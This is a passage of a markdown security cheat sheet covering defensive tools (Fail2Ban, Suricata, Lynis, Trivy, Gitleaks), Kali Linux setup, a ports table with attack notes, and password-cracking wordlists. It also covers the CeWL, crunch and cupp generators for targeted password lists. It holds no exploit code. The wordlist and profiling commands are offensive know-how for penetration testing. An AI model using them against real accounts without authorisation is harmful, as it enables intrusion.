
---

## Defensive Security

### Fail2Ban — Intrusion Prevention

```bash
# Install
sudo apt install fail2ban

# Config
sudo cp /etc/fail2ban/jail.conf /etc/fail2ban/jail.local
sudo nano /etc/fail2ban/jail.local

# /etc/fail2ban/jail.local
# [sshd]
# enabled = true
# maxretry = 3
# bantime = 3600
# findtime = 600

sudo systemctl enable fail2ban
sudo systemctl start fail2ban

# Management
sudo fail2ban-client status
sudo fail2ban-client status sshd
sudo fail2ban-client set sshd unbanip 192.168.1.1

# Check banned IPs
sudo iptables -L -n | grep DROP
```

---

### Suricata — IDS/IPS

```bash
# Install
sudo apt install suricata

# Config
sudo nano /etc/suricata/suricata.yaml
# Set: HOME_NET, interface

# Update rules
sudo suricata-update

# Run
sudo suricata -c /etc/suricata/suricata.yaml -i eth0

# Test
sudo suricata -T -c /etc/suricata/suricata.yaml  # test config
curl http://testmynids.org/uid/index.html         # trigger test rule

# Logs
tail -f /var/log/suricata/fast.log
tail -f /var/log/suricata/eve.json | jq .
```

---

### Lynis — Security Auditing

```bash
# Install
brew install lynis
sudo apt install lynis

# System audit
sudo lynis audit system

# Quick scan
lynis audit system --quick

# Docker
lynis audit dockerfile Dockerfile

# Reports
cat /var/log/lynis.log
cat /var/log/lynis-report.dat
```

---

### Trivy — Container/Code Vulnerability Scanner

```bash
# Install
brew install trivy

# Scan container image
trivy image nginx:latest
trivy image myapp:latest
trivy image --severity HIGH,CRITICAL nginx:latest

# Scan filesystem
trivy fs .
trivy fs --security-checks vuln,secret .

# Scan IaC
trivy config ./terraform/
trivy config ./k8s/

# Scan git repo
trivy repo https://github.com/user/repo

# SBOM (Software Bill of Materials)
trivy sbom ./myapp.spdx.json
trivy image --format spdx-json myapp:latest > sbom.json
```

---

### Gitleaks — Secret Scanner

```bash
# Install
brew install gitleaks

# Scan repo
gitleaks detect --source .
gitleaks detect --source . --verbose

# Scan git history
gitleaks detect --source . --log-opts="HEAD~10..HEAD"

# Scan specific commit
gitleaks detect --source . --log-opts="abc1234..def5678"

# Pre-commit hook
cat > .pre-commit-config.yaml << 'EOF'
repos:
  - repo: https://github.com/gitleaks/gitleaks
    rev: v8.18.0
    hooks:
      - id: gitleaks
EOF
pre-commit install
```

---

## Kali Linux & Parrot OS

### Kali Linux Setup

```bash
# Update everything
sudo apt update && sudo apt full-upgrade -y

# Install tool categories
sudo apt install -y kali-tools-top10
sudo apt install -y kali-tools-web
sudo apt install -y kali-tools-passwords
sudo apt install -y kali-tools-wireless
sudo apt install -y kali-tools-forensics
sudo apt install -y kali-tools-crypto-stego
sudo apt install -y kali-tools-exploitation

# Enable SSH
sudo systemctl enable ssh
sudo systemctl start ssh

# Setup non-root user
sudo useradd -m -s /bin/zsh -G sudo myuser
sudo passwd myuser

# Install wordlists
sudo apt install -y wordlists
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# Common wordlists
ls /usr/share/wordlists/
# rockyou.txt (14M passwords)
# dirb/common.txt (4600 paths)
# dirbuster/directory-list-2.3-medium.txt (220K paths)
# SecLists (comprehensive)

# Install SecLists
sudo apt install -y seclists
ls /usr/share/seclists/
```

---

## Quick Reference — Common Ports

| Port | Service | Notes |
|---|---|---|
| 21 | FTP | Often anonymous access |
| 22 | SSH | Brute force, key-based |
| 23 | Telnet | Unencrypted |
| 25 | SMTP | Email relay |
| 53 | DNS | Zone transfers (AXFR) |
| 80 | HTTP | Web attacks |
| 110 | POP3 | Email |
| 139/445 | SMB | Windows file sharing, EternalBlue |
| 143 | IMAP | Email |
| 389 | LDAP | Directory service |
| 443 | HTTPS | TLS/SSL |
| 1433 | MSSQL | SQL Server |
| 1521 | Oracle DB | |
| 3306 | MySQL | |
| 3389 | RDP | Remote Desktop |
| 5432 | PostgreSQL | |
| 5985/5986 | WinRM | Windows Remote Management |
| 6379 | Redis | Often unauthenticated |
| 8080 | HTTP Alt | Dev/proxy |
| 8443 | HTTPS Alt | |
| 27017 | MongoDB | Often unauthenticated |

---

## Wordlists Reference

```bash
# SecLists (most comprehensive)
sudo apt install seclists       # Kali
brew install seclists           # macOS
# /usr/share/seclists/

# Key lists:
# Passwords/Leaked-Databases/rockyou.txt.tar.gz
# Discovery/Web-Content/common.txt
# Discovery/Web-Content/directory-list-2.3-big.txt
# Discovery/DNS/subdomains-top1million-20000.txt
# Usernames/top-usernames-shortlist.txt
# Fuzzing/LFI/LFI-Jhaddix.txt
# Fuzzing/SQLi/Generic-SQLi.txt

# CeWL — generate wordlist from website
cewl https://example.com -m 5 -w custom_wordlist.txt
cewl https://example.com -m 5 --email -w wordlist.txt

# Crunch — generate custom wordlists
crunch 8 8 abc123 -o wordlist.txt          # 8-char wordlist from charset
crunch 6 8 -t @@@@##                       # pattern: 4 letters + 2 digits

# Mentalist — GUI wordlist generator
# cupp — common user password profiler
pip install cupp
cupp -i                          # interactive profile
```
